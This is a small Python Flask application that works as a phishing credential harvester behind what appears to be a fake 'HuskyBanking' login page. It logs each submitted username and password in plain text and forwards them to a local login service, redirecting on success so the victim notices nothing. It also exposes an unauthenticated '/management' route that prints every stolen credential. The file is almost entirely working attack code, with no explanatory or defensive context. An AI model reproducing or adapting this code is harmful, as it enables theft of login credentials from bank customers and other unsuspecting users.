from flask import Flask, render_template, request, redirect
import requests


app = Flask(__name__)


@app.route('/', methods=['GET', 'POST'])
def home():
    if request.method == "POST":
        username = request.form.get('username')
        password = request.form.get('password')
        with open('userdata.txt', 'a') as f:
            f.write(f'Username: {username} - Password: {password}\n')
            data = {"username": username, "password": password, "submit": "submit"}
            response = requests.post('http://localhost:2222', data=data)
            if response.status_code == 200 and "You Logged In" in response.text:
                 return redirect('http://localhost:2222', 307)
            else:
                return redirect('http://localhost:5000')


    return render_template('HuskyBanking.html')


@app.route('/management')
def management():
    with open('userdata.txt', 'r') as f:
        return f.read()


if __name__ == '__main__':
    app.run()
